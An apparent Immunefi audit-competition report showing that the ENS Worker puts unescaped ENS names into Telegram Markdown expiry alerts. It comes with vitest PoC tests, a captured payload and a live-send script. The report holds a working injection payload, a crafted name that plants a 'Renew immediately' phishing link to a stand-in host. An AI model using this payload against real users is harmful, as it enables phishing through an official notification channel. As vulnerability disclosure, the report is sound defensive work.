# 92986 w a insight ens worker allows telegram markdown injection

**Submitted on Sep 13th 2026 at 16:53:55 UTC by @mussucal for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92986
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The ENS Worker sends expiry-reminder notifications through an official Telegram bot. It builds each message with parse\_mode: 'Markdown' and interpolates the ENS name straight into the message body and a button URL with no escaping. The name reaching that code is the raw on-chain name, and notifications are delivered not only to a name's owner but to every user who favourited it.

An attacker registers a name whose text is itself Markdown — for example a label containing `[⚠️ Renew now](https://ens-renew.example)`. When that name nears expiry, the Worker generates an official-bot message in which the attacker's […](broken://pages/48093a2c5376710c038f1380fb162528515c322d) link sequence appears verbatim, and it selects every non-owner who favourited the name as a recipient. The injected sequence is standard Telegram Markdown link syntax; when Telegram parses it, it renders as a clickable link the attacker controls, inside a message from the official ENS bot.

This is an active content-injection primitive: the attacker persistently controls text and links rendered in an official ENS notification delivered to other users. It is not a display-quirk and not a passive look-alike — the attacker chooses the injected content.

## Vulnerability Details

Security invariant. Attacker-controlled ENS name data must remain literal text when incorporated into an official Telegram notification; it must not create new Markdown entities or attacker-controlled links. This finding demonstrates that invariant broken: the name creates a text\_link entity to an attacker-controlled destination.

1. Root cause — the name is interpolated into a Markdown sink with no escaping

services/delivery/templates/telegram.ts, the name-expiry template (lines 28–49), verbatim:

ts 'name-expiry': (payload) => { const daysLeft = Math.ceil( (payload.expiryDate - Date.now()) / (1000 \* 60 \* 60 \* 24), )

const ownerText = payload.isOwner ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain! `:`The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.\`

return { text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`, parseMode: 'Markdown', buttons: \[ \[ { text: '🔄 Renew Now', url: `https://app.ens.domains/${payload.name}` } ], ], } },

payload.name is placed, unescaped, into (a) the message body inside a `…` code span, in a string emitted with parseMode: 'Markdown', and (b) the button URL. There is no escaping or sanitization helper anywhere on this path. This is the vulnerability: attacker-controlled data entering a Markdown-parsed trusted message without escaping.

The only fact the finding needs here: the application selects parse\_mode: 'Markdown' while interpolating attacker-controlled payload.name without escaping, and the live Telegram API response (see the rendering-boundary appendix) demonstrates that the resulting sequence is parsed into a text\_link entity whose destination is the attacker-controlled URL.

2. Handoff — the generated message is forwarded to Telegram unchanged

services/delivery/telegram.ts, deliverTelegramNotification (lines 57–73), verbatim:

```ts
const message = template(
  deliveryJob.notification.payload as AnyPersonalNotificationPayload,
)
…
const result = yield* makeTelegramRequest(botToken, 'sendMessage', {
  chat_id: deliveryJob.target,
  text: message.text,            // forwarded unchanged
  parse_mode: message.parseMode, // 'Markdown'
  reply_markup: replyMarkup,
})
```

The Worker submits the generated text and parse\_mode to Telegram's sendMessage with no transformation. HANDOFF-1 in the PoC drives this real function and captures the exact outbound payload, confirming the injected markup and parse\_mode: 'Markdown' reach the API call intact. This is an ENS-Worker action — the Worker constructs attacker-controlled Markdown and submits it to Telegram with Markdown parsing enabled. Telegram is the rendering/delivery substrate, not the vulnerable asset.

3. Reach — favourited names deliver to non-owners

queues/event-ingestion.ts, collectRecipientsForEvent (lines 75–106): if event.includeFavorites, every user in favoriteUsersByName.get(event.name) is added as a 'favourited' recipient. The template's non-owner branch — "The domain … you're watching …" — serves exactly them. So the injected message reaches any user who favourited the attacker's name, which is the app's supported way to watch a name's expiry (gated by the favourited\_name\_expiry preference). This is what makes the primitive cross-user rather than self-affecting. REACH-1 in the PoC drives this real function and asserts a favouriting non-owner is returned as a recipient.

4. Persistence — the raw name is stored verbatim in the payload

queues/event-ingestion.ts, processExpiryEvents (lines 223–233): the notification payload is built with name: event.name — the raw name from the indexer — with no normalization or escaping. It is stored and later handed to the template at delivery time. The attacker-controlled name is therefore retained in the expiry notification payload and reused when the corresponding expiry notification is generated: the injected content is not a single reflected request but is stored as part of the notification data and can recur across the notification lifecycle.

5. Enabling condition (not the root cause) — ENS names can carry Markdown metacharacters

The payload requires a name containing characters such as backtick, \[, ], (, ). ENS registration performs no character normalization on-chain (the registrar operates on the labelhash of arbitrary bytes), so such a name is registrable. This is only the enabling condition — it is how the attacker constructs the payload, not the defect. The defect is that the Worker treats that name as trusted Markdown content. Even independently of look-alike concerns, a name containing a single backtick or \[ is enough to inject.

Not a duplicate — distinct sink and root cause

A known issue (EXP-INPUT-005, "validators accept inputs that normalization later rejects") concerns ENS accepting deceptive/invalid characters — that is an input-primitive issue, the same class as the enabling condition in §5. This report is not that finding.

That is about what names ENS accepts — an input-primitive issue. This is about a specific sink: the Worker interpolating an attacker-controlled name into a Markdown-parsed official notification without escaping, and delivering it cross-user.

Escaping the Telegram message (the fix here) does not touch name-acceptance or profile display; normalizing name input (the fix for the input-primitive issues) does not remove this sink — an unescaped \*, \_, or \[ surviving in any allowed name still injects, and the Worker must not trust that upstream normalization occurred. Different root cause, different fix. Under the program's known-issue policy, a new consequence arising from a distinct root cause is in scope; the normalization gap is merely the payload-construction enabler, cited for completeness.

## Impact Details

High — persistent content injection in the in-scope ENS Worker notification channel.

The in-scope vulnerable asset is workers/api-worker. The Worker constructs an official ENS notification from attacker-controlled ENS name data and submits that data to Telegram with Markdown parsing enabled. The demonstrated impact is persistent attacker-controlled content injection into an official ENS communication channel:

the attacker controls the ENS name containing the injected Markdown; the Worker persists and reuses that name in expiry notification payloads; the notification is delivered to users who favourited the name, including non-owner recipients; the Worker emits attacker-controlled Markdown syntax in the official notification; the live Telegram boundary confirms that the payload is parsed into a text\_link entity whose destination is controlled by the attacker.

This is a persistent, non-JavaScript content-injection primitive. The vulnerable code and required fix are entirely within the in-scope Worker; Telegram is only the downstream rendering/delivery substrate.

The vulnerable asset is an in-scope ENS Worker that constructs and submits persistent attacker-controlled notification content, delivered through the project's official ENS notification channel to other users. We therefore map the finding to the program's persistent, non-JavaScript content-injection category. The report does not claim that Telegram itself is vulnerable, and does not assert that Telegram is the target application.

Not Critical / not XSS. Telegram Markdown is not HTML or JavaScript execution. The demonstrated primitive is attacker-controlled clickable-link / markup injection, which is the High content-injection category — not the Critical "malicious HTML or XSS" category. We do not claim XSS.

Live rendering proof. The exact payload produced by the Worker was submitted to a tester-controlled Telegram bot/chat. Telegram returned ok: true and a text\_link entity whose url exactly matched the attacker-controlled destination. Therefore the attacker-controlled Markdown emitted by the Worker is not merely syntactic text: Telegram accepted it as a clickable link. No victim interaction is required to establish the vulnerability — the tester-controlled bot/chat is sufficient to demonstrate the rendering boundary. (Full API response in the rendering-boundary appendix.)

Security significance (stated as significance, not an executed step). Attacker-controlled links injected into a high-trust official channel are a phishing vector. This report proves the injection primitive and the rendering boundary; it does not claim any victim interaction, click, or downstream compromise.

## PoC descriptions

INJ-1

Drives: Real telegramTemplates\['name-expiry']

Proves: A crafted name produces message text containing attacker-controlled Markdown link syntax, […](broken://pages/48093a2c5376710c038f1380fb162528515c322d), with parseMode: 'Markdown'. Prints the exact generated text.

INJ-2

Drives: Real template

Proves: The button URL embeds the raw, unescaped name.

INJ-3 — Control

Drives: Real template

Proves: A benign name yields no ]\( link syntax, so INJ-1's link is the injection rather than a constant.

HANDOFF-1

Drives: Real deliverTelegramNotification, mocking only the DB and outbound HTTP client

Proves: The exact sendMessage payload the Worker hands Telegram carries the injected markup and parse\_mode: 'Markdown' unchanged. Prints the captured payload.

REACH-1

Drives: Real collectRecipientsForEvent

Proves: A non-owner who favourited the name is returned as a 'favourited' recipient.

INJ-TELEGRAM — Opt-in Live Test

Drives: Telegram Bot API, with a bot and chat controlled by the tester

Proves: Sending the real template's exact payload returns ok: true and a text\_link entity whose url is the attacker-controlled destination — Telegram rendered the Worker payload as a clickable attacker link.

Execution condition: Skipped unless TELEGRAM\_BOT\_TOKEN and TELEGRAM\_CHAT\_ID are set.

INJ-2 documents a secondary sink (the raw name in the button URL); the finding does not depend on it — the message-body Markdown injection (INJ-1 → HANDOFF-1 → INJ-TELEGRAM) is sufficient on its own.

### What is executed and what is not

Executed against real in-scope code: the message build (INJ-1/2/3), the Worker→Telegram sendMessage handoff (HANDOFF-1, DB and HTTP client mocked at their boundaries only), and the recipient selection (REACH-1). Executed at the external boundary (opt-in): Telegram's rendering of the emitted Markdown as a clickable attacker link (INJ-TELEGRAM), confirmed from Telegram's own API response (ok: true + a text\_link entity with the attacker URL). Off by default so the suite runs with no credentials; on when the tester supplies a bot and chat they control. Cited, not executed: the on-chain registrability of a name containing Markdown metacharacters (the enabling condition), consistent with the registrar applying no normalization.

### Repo files under test (unmodified — for reviewer reference)

workers/api-worker/src/services/delivery/templates/telegram.ts :28-49 (build; the sink — root cause) workers/api-worker/src/services/delivery/telegram.ts :57-73 (sendMessage handoff, unchanged) workers/api-worker/src/queues/event-ingestion.ts :75-106 (collectRecipientsForEvent; reach) workers/api-worker/src/queues/event-ingestion.ts :223-233 (raw name persisted in payload) workers/api-worker/src/services/expiry-discovery/indexer.ts :13-28 (name sourced raw from subgraph)

### Steps to run the PoC

Prerequisites Node.js ≥ 22, pnpm\@10.27.0 (the repo's packageManager)

Step 0 — clone and install

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout audit-comp-ready
pnpm install
```

Step 1 — place the attached file workers/api-worker/src/services/delivery/telegram-markdown-injection.audit.test.ts

Step 2 — run it

```bash
cd workers/api-worker
npx vitest run src/services/delivery/telegram-markdown-injection.audit.test.ts
```

Expected output — 5 passed (the passes are the finding: the Worker emits attacker Markdown, forwards it to Telegram unchanged, and delivers it cross-user). The run prints the exact generated message and the captured sendMessage payload so the injected link is visible in the output:

✓ INJ-1 crafted name injects attacker-controlled Markdown link syntax into the message text ✓ INJ-2 the "Renew Now" button URL embeds the raw, unescaped name ✓ INJ-3 control: a normal name produces no injected link syntax ✓ HANDOFF-1 the exact sendMessage payload forwards the injected markup + parse\_mode 'Markdown' ✓ REACH-1 a non-owner who favourited the name is a 'favourited' recipient ↓ INJ-TELEGRAM (skipped — no TELEGRAM\_BOT\_TOKEN / TELEGRAM\_CHAT\_ID)

Test Files 1 passed (1) Tests 5 passed | 1 skipped (6) Step 3 — the external rendering boundary (opt-in live test)

This closes the last gap: that Telegram parses the Worker's exact payload into an attacker-controlled clickable link. It needs a Telegram bot and a chat you control — no victim, no phishing site, no wallet, no funds, no production ENS user.

Create a bot with Telegram's @BotFather and copy its token. Start a chat with your bot (or add it to a group) and obtain the numeric chat\_id (e.g. send the bot a message, then read <https://api.telegram.org/bot/getUpdates>). Optionally point the injected link at an endpoint you control so you can also observe the click arriving:

```bash
cd workers/api-worker
M13_URL="https://<your-controlled-domain>/m13" \
TELEGRAM_BOT_TOKEN="<token from @BotFather>" \
TELEGRAM_CHAT_ID="<your chat id>" \
npx vitest run src/services/delivery/telegram-markdown-injection.audit.test.ts
```

INJ-TELEGRAM now runs. It sends the real template's exact payload and asserts Telegram's response is ok: true with a text\_link entity whose url is M13\_URL. Expected tail:

✓ INJ-TELEGRAM Telegram parses the Worker payload into an attacker-controlled text\_link

```
  Tests  6 passed (6)
```

The printed \[INJ-TELEGRAM] Telegram API response block shows Telegram's own parse result — the text\_link entity carrying your attacker-controlled URL — and the message arrives in your chat from the bot with ⚠️ Renew immediately as a live clickable link. Screenshot it for the report if you want the visual alongside the API proof.

Appendix — captured run output (executed offline PoC)

Verbatim from a run of the attached spec (INJ-1 and HANDOFF-1 print their artifacts):

\[INJ-1] generated message.text: ⚠️ *Domain Expiration Alert*

The domain `a`[⚠️ Renew immediately](https://ens-renew.example/connect)`b.eth` you're watching will expire in *3 days*.

\[HANDOFF-1] outbound sendMessage payload: { "chat\_id": "victim-chat-id", "text": "⚠️ *Domain Expiration Alert*\n\nThe domain `a`[⚠️ Renew immediately](https://ens-renew.example/connect)`b.eth` you're watching will expire in *3 days*.", "parse\_mode": "Markdown", "reply\_markup": { "inline\_keyboard": \[ \[ { "text": "🔄 Renew Now", "url": "<https://app.ens.domains/a`[⚠️> Renew immediately]\(<https://ens-renew.example/connect)`b.eth>" } ] ] } }

✓ INJ-1 ✓ INJ-2 ✓ INJ-3 ✓ HANDOFF-1 ✓ REACH-1 Tests 5 passed (5)

The attacker controls the injected link's visible text (⚠️ Renew immediately) and its destination. The identical string is present in the message body and in the outbound sendMessage payload with parse\_mode: "Markdown", confirming the injection survives the real Worker's build → deliver path unchanged. (The 🔄 Renew Now button is the Worker's own legitimate control; the injection of concern is the message-body link.)

Appendix — external rendering boundary (executed live via the Telegram Bot API)

Sending the exact Worker output — the captured HANDOFF-1 payload (fixture m13-handoff-payload.json, byte-verified against templates/telegram.ts) — to a Telegram bot and chat controlled by the tester returned, from Telegram's own API (identifiers redacted):

```json
{
  "ok": true,
  "result": {
    "from": { "is_bot": true, "username": "<audit-bot>" },
    "chat": { "type": "private" },
    "text": "⚠️ Domain Expiration Alert\n\nThe domain a⚠️ Renew immediatelyb.eth you're watching will expire in 3 days.",
    "entities": [
      { "offset": 3,  "length": 23, "type": "bold" },
      { "offset": 39, "length": 1,  "type": "code" },
      { "offset": 40, "length": 20, "type": "text_link", "url": "https://ens-renew.example/connect" },
      { "offset": 60, "length": 5,  "type": "code" },
      { "offset": 97, "length": 6,  "type": "bold" }
    ],
    "link_preview_options": { "url": "https://ens-renew.example/connect" }
  }
}
```

The payload sent is the exact Worker output (byte-verified against templates/telegram.ts, ASCII apostrophe in "you're"; sent verbatim from the captured HANDOFF-1 fixture). With ok: true, the Markdown [⚠️ Renew immediately](https://ens-renew.example/connect) was consumed: the visible text "⚠️ Renew immediately" (offset 40, length 20) is returned as a text\_link entity whose url equals the attacker-controlled destination, and link\_preview\_options.url is that same URL.

Stated precisely, to the exact boundary the evidence reaches: Telegram accepted the in-scope Worker's exact Markdown payload and returned the resulting message with a text\_link entity whose destination equals the attacker-controlled URL — a machine-verifiable parser/rendering result from Telegram's own API, not an inference. Per the Telegram Bot API, text\_link is the entity type for clickable text URLs.

Supplementary visual evidence (m13-telegram-render.png): the delivered message as rendered in a Telegram client. The attacker-chosen label "⚠️ Renew immediately" appears as a link-styled (clickable) text link, between the a and b.eth code spans left by the code-span breakout — visually confirming the text\_link entity from the API response. This screenshot is corroboration, not the basis of the proof.

## References

Vulnerable code (root cause — in-scope Worker)

workers/api-worker/src/services/delivery/templates/telegram.ts:28-49 — raw payload.name in a parse\_mode: 'Markdown' body and button URL, unescaped workers/api-worker/src/services/delivery/telegram.ts:57-73 — forwards message.text + parse\_mode to sendMessage unchanged workers/api-worker/src/queues/event-ingestion.ts:75-106 — non-owner favouriters are recipients workers/api-worker/src/queues/event-ingestion.ts:223-233 — raw event.name persisted in the payload

Standards / references

Telegram Bot API — formatting options; user-controlled substrings must be escaped: <https://core.telegram.org/bots/api#formatting-options> ENSIP-15 — ENS name normalization (the standard the on-chain label bypasses; enabling condition only): <https://docs.ens.domains/ensip/15>

## Proof of Concept

## Proof of Concept

### workers/api-worker/src/services/delivery/telegram-markdown-injection.audit.test.ts

```ts
/**
 * Audit anchor — the in-scope Worker builds an official ENS Telegram
 * notification from an unescaped attacker-controlled ENS name, injecting
 * persistent attacker-controlled Markdown, and delivers it to non-owner
 * favouriters.
 *
 * These assert OBSERVED behaviour of the REAL Worker code, so the PASSES are the
 * finding. What is proven here (executed):
 *
 *   INJ-1/2/3   the real `telegramTemplates['name-expiry']` emits the attacker's
 *               `[…](…)` link SYNTAX into a `parse_mode: 'Markdown'` message.
 *   HANDOFF-1   the real `deliverTelegramNotification` forwards that generated
 *               text + parse_mode to Telegram's sendMessage UNCHANGED (DB and the
 *               outbound HTTP client mocked at their boundaries only).
 *   REACH-1     the real `collectRecipientsForEvent` selects a non-owner who
 *               favourited the name as a recipient.
 *   INJ-TELEGRAM (live, opt-in) sends the REAL template's exact payload to a
 *               Telegram bot/chat YOU control and asserts Telegram parsed it into
 *               an attacker-controlled `text_link` — i.e. Telegram rendered the
 *               Worker's payload as a clickable attacker link. Runs only when
 *               TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set; otherwise skipped.
 *
 * Run (offline, 5 tests):
 *   cd workers/api-worker
 *   npx vitest run src/services/delivery/telegram-markdown-injection.audit.test.ts
 *
 * Run (with the live Telegram rendering test, 6 tests) — bot + chat you control:
 *   M13_URL="https://<your-controlled-domain>/m13" \
 *   TELEGRAM_BOT_TOKEN="<your bot token from @BotFather>" \
 *   TELEGRAM_CHAT_ID="<your chat id>" \
 *   npx vitest run src/services/delivery/telegram-markdown-injection.audit.test.ts
 */

import { describe, expect, it, vi } from 'vitest'

// Capture bucket for the outbound Telegram payload, hoisted so the vi.mock
// factory can close over it.
const h = vi.hoisted(() => ({ sent: [] as Array<Record<string, unknown>> }))

// Mock ONLY the outbound Telegram HTTP client (and the keyboard helper) at the
// boundary the delivery function calls. Everything else in the delivery path is
// the real Worker code.
vi.mock('#services/telegram/utils.js', async () => {
  const { okAsync } = await import('neverthrow')
  return {
    makeTelegramRequest: (_token: string, _method: string, payload: Record<string, unknown>) => {
      h.sent.push(payload)
      return okAsync({ message_id: 1 })
    },
    createInlineKeyboard: (buttons: unknown) => ({ inline_keyboard: buttons }),
  }
})

import { collectRecipientsForEvent } from '../../queues/event-ingestion.js'
import { deliverTelegramNotification } from './telegram.js'
import { telegramTemplates } from './templates/telegram.js'

// The attacker-controlled destination. Any https URL proves the primitive; point
// it at an endpoint you control to also observe the click arriving.
const M13_URL = process.env.M13_URL ?? 'https://ens-renew.example/connect'

// A label an attacker can register (ENS does not normalize on-chain — this is
// the enabling condition, not the vulnerability). It closes the code span the
// template wraps the name in, injects a Markdown link, then re-opens one.
const EVIL_NAME = `a\`[⚠️ Renew immediately](${M13_URL})\`b.eth`
const INJECTED_LINK = `](${M13_URL})`

const basePayload = (name: string) => ({
  name,
  expiryDate: Date.now() + 3 * 24 * 60 * 60 * 1000,
  isOwner: false,
  watchReason: 'favourited' as const,
})

describe('the in-scope Worker emits attacker-controlled Markdown in the official ENS notification', () => {
  it('INJ-1: crafted name injects attacker-controlled Markdown link syntax into the message text', () => {
    // biome-ignore lint/suspicious/noExplicitAny: audit harness builds a minimal payload
    const msg = telegramTemplates['name-expiry'](basePayload(EVIL_NAME) as any)
    // Evidence capture — the exact generated message the Worker will send:
    console.log('[INJ-1] generated message.text:\n' + msg.text)
    expect(msg.text).toContain(INJECTED_LINK) // attacker link syntax, unescaped
    expect(msg.parseMode).toBe('Markdown') // will be parsed as Markdown by Telegram
  })

  it('INJ-2: the "Renew Now" button URL embeds the raw, unescaped name', () => {
    // biome-ignore lint/suspicious/noExplicitAny: audit harness
    const msg = telegramTemplates['name-expiry'](basePayload(EVIL_NAME) as any)
    console.log('[INJ-2] button url:', msg.buttons?.[0]?.[0]?.url)
    expect(msg.buttons?.[0]?.[0]?.url).toBe(`https://app.ens.domains/${EVIL_NAME}`)
  })

  it('INJ-3 control: a normal, normalized name produces no injected link syntax', () => {
    // biome-ignore lint/suspicious/noExplicitAny: audit harness
    const msg = telegramTemplates['name-expiry'](basePayload('vitalik.eth') as any)
    expect(msg.text).not.toContain('](')
  })
})

describe('the Worker forwards the injected message to Telegram unchanged', () => {
  it('HANDOFF-1: the exact sendMessage payload carries the injected markup + parse_mode Markdown', async () => {
    h.sent.length = 0

    // Fake DB at the exact boundary deliverTelegramNotification uses: it reads a
    // delivery row with the stored notification payload, then writes a status
    // update. No real database is involved.
    const fakeDb = {
      query: {
        notificationDeliveries: {
          findFirst: async () => ({
            target: 'victim-chat-id',
            notification: { payload: basePayload(EVIL_NAME) },
          }),
        },
      },
      update: () => ({ set: () => ({ where: async () => undefined }) }),
      // biome-ignore lint/suspicious/noExplicitAny: audit harness fakes the DB boundary
    } as any

    const res = await deliverTelegramNotification(
      'test-bot-token',
      fakeDb,
      // biome-ignore lint/suspicious/noExplicitAny: audit harness
      { id: 'delivery-1', kind: 'name-expiry' } as any,
    )

    expect(res.isOk()).toBe(true)
    expect(h.sent).toHaveLength(1)
    const payload = h.sent[0]
    // Evidence capture — the exact payload handed to Telegram's sendMessage:
    console.log('[HANDOFF-1] outbound sendMessage payload:\n' + JSON.stringify(payload, null, 2))
    expect(payload.text as string).toContain(INJECTED_LINK) // forwarded unchanged
    expect(payload.parse_mode).toBe('Markdown')
  })
})

describe('the injected message is delivered to non-owners who favourited the name', () => {
  it('REACH-1: a non-owner favouriter is a favourited recipient', () => {
    const event = {
      type: 'name_expiring',
      name: EVIL_NAME,
      expiryDate: 1_700_000_000,
      stage: 'expired',
      owner: '0x000000000000000000000000000000000000dEaD',
      includeFavorites: true,
      // biome-ignore lint/suspicious/noExplicitAny: audit harness builds a minimal ExpiryEvent
    } as any

    const ownerToUserId = new Map<string, string>() // attacker name has no app-user owner
    const favoriteUsersByName = new Map<string, Set<string>>([
      [EVIL_NAME, new Set(['victim-user-id'])],
    ])

    const recipients = collectRecipientsForEvent(
      event,
      ownerToUserId,
      favoriteUsersByName,
    )

    expect(recipients.get('victim-user-id')).toBe('favourited')
  })
})

// The final external boundary. Opt-in: runs only with a bot + chat YOU control.
// Sends the REAL template's exact payload and asserts Telegram parsed it into an
// attacker-controlled clickable link (a `text_link` entity whose url is M13_URL).
const live = process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID
const liveIt = live ? it : it.skip

describe('Telegram renders the exact Worker-generated payload as a clickable attacker link', () => {
  liveIt(
    'INJ-TELEGRAM: Telegram parses the Worker payload into an attacker-controlled text_link',
    async () => {
      // biome-ignore lint/suspicious/noExplicitAny: audit harness
      const msg = telegramTemplates['name-expiry'](basePayload(EVIL_NAME) as any)

      const resp = await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: msg.text,
            parse_mode: msg.parseMode,
            reply_markup: { inline_keyboard: msg.buttons },
          }),
        },
      )
      const body = (await resp.json()) as {
        ok: boolean
        result?: { entities?: Array<{ type: string; url?: string }> }
        description?: string
      }
      console.log('[INJ-TELEGRAM] Telegram API response:\n' + JSON.stringify(body, null, 2))

      // ok:true means Telegram accepted and PARSED the Markdown entities
      // (malformed markdown returns 400 "can't parse entities").
      expect(body.ok).toBe(true)

      // The [text](url) rendered as a clickable link entity pointing at the
      // attacker-controlled destination.
      const link = (body.result?.entities ?? []).find((e) => e.type === 'text_link')
      expect(link?.url).toBe(M13_URL)
    },
    20_000,
  )
})
```

### workers/api-worker/m13-handoff-payload.json

```json
{
  "_comment": "The exact sendMessage payload the real ENS Worker emits for a crafted name, as captured executed by HANDOFF-1 (telegram-markdown-injection.audit.test.ts) and byte-verified against services/delivery/templates/telegram.ts:35 (ASCII apostrophe in \"you're\"). chat_id is added by m13-telegram-render.mjs at send time.",
  "text": "⚠️ *Domain Expiration Alert*\n\nThe domain `a`[⚠️ Renew immediately](https://ens-renew.example/connect)`b.eth` you're watching will expire in *3 days*.",
  "parse_mode": "Markdown",
  "reply_markup": {
    "inline_keyboard": [
      [
        {
          "text": "🔄 Renew Now",
          "url": "https://app.ens.domains/a`[⚠️ Renew immediately](https://ens-renew.example/connect)`b.eth"
        }
      ]
    ]
  }
}
```

### workers/api-worker/m13-telegram-render.mjs

```js
/**
 * M-13 — external rendering boundary check (standalone, no vitest / no Workers pool).
 *
 * It sends the EXACT payload the in-scope ENS Worker emits and asserts, from
 * Telegram's own API response, that Telegram parsed it into an
 * attacker-controlled `text_link` entity. Needs a Telegram bot + chat YOU
 * control — no victim, no phishing site, no wallet, no funds, no production user.
 *
 * Payload source (in priority order):
 *   1. ./m13-handoff-payload.json — the exact sendMessage payload captured
 *      executed by HANDOFF-1 (real template + real delivery function), byte-
 *      verified against services/delivery/templates/telegram.ts. This is the
 *      "real Worker output -> captured payload -> live Telegram" chain.
 *   2. Fallback: a byte-exact reconstruction of that template output (ASCII
 *      apostrophe, matching the source), parameterised by M13_URL.
 *
 * Create a bot with @BotFather; get chat_id from
 *   https://api.telegram.org/bot<token>/getUpdates  (after messaging the bot).
 *
 * Run:
 *   TELEGRAM_BOT_TOKEN="<token>" TELEGRAM_CHAT_ID="<chat id>" node m13-telegram-render.mjs
 * (Fallback mode only, if the fixture is absent, also set M13_URL="https://<you>/m13".)
 */

import { existsSync, readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'

const token = process.env.TELEGRAM_BOT_TOKEN
const chatId = process.env.TELEGRAM_CHAT_ID
if (!token || !chatId) {
  console.error('Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.')
  process.exit(1)
}

const fixturePath = fileURLToPath(new URL('./m13-handoff-payload.json', import.meta.url))

let text
let replyMarkup
let mode

if (existsSync(fixturePath)) {
  const f = JSON.parse(readFileSync(fixturePath, 'utf8'))
  text = f.text
  replyMarkup = f.reply_markup
  mode = 'fixture: exact captured HANDOFF-1 Worker output (byte-verified vs template source)'
} else {
  // Byte-exact reconstruction of services/delivery/templates/telegram.ts name-expiry
  // (non-owner branch). ASCII apostrophe in "you're", matching the source.
  const url = process.env.M13_URL ?? 'https://ens-renew.example/connect'
  const name = 'a`[⚠️ Renew immediately](' + url + ')`b.eth'
  text =
    '⚠️ *Domain Expiration Alert*\n\n' +
    "The domain `" + name + "` you're watching will expire in *3 days*."
  replyMarkup = {
    inline_keyboard: [[{ text: '🔄 Renew Now', url: `https://app.ens.domains/${name}` }]],
  }
  mode = 'byte-exact reconstruction of the template output (ASCII apostrophe)'
}

// Derive the attacker-controlled destination from the message text itself, so
// the assertion checks what the payload actually carries.
const m = /\]\((https?:\/\/[^)\s]+)\)/.exec(text)
const expectedUrl = m ? m[1] : null

const payload = { chat_id: chatId, text, parse_mode: 'Markdown', reply_markup: replyMarkup }

console.log(`payload source: ${mode}`)
console.log(`attacker-controlled destination in payload: ${expectedUrl}\n`)
console.log('Sending to Telegram:\n' + JSON.stringify(payload, null, 2))

const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify(payload),
})
const body = await resp.json()

console.log('\nTelegram API response:\n' + JSON.stringify(body, null, 2))

// Evidence-gated assertions (all four must hold):
//   1. Telegram accepted & parsed the Markdown (malformed -> HTTP 400 / ok:false)
//   2. a text_link entity exists
//   3. its url === the attacker-controlled destination in the payload
//   4. the rendered message text still carries the attacker-chosen visible label
const link = (body.result?.entities ?? []).find(
  (e) => e.type === 'text_link' && e.url === expectedUrl,
)
const labelPresent = typeof body.result?.text === 'string' && body.result.text.includes('Renew immediately')

if (body.ok && link && labelPresent) {
  console.log(
    '\n✅ M-13 rendering boundary CONFIRMED. Telegram accepted the Worker’s exact Markdown\n' +
      '   payload and returned a text_link entity whose destination equals the attacker-\n' +
      `   controlled URL:\n     ${link.url}\n` +
      '   Visible attacker-chosen label "Renew immediately" is present in the parsed message.\n' +
      '   (This proves Telegram parsed the payload into an attacker-controlled link entity; a\n' +
      '    screenshot of the message is supplementary visual evidence, not the basis of the proof.)',
  )
} else {
  console.log(
    '\n❌ Not confirmed. Checks -> ok:' + body.ok +
      ' text_link_to_expected_url:' + Boolean(link) +
      ' label_present:' + labelPresent +
      '. If ok:false with "can’t parse entities", the markdown was rejected; otherwise inspect entities above.',
  )
  process.exit(1)
}
```
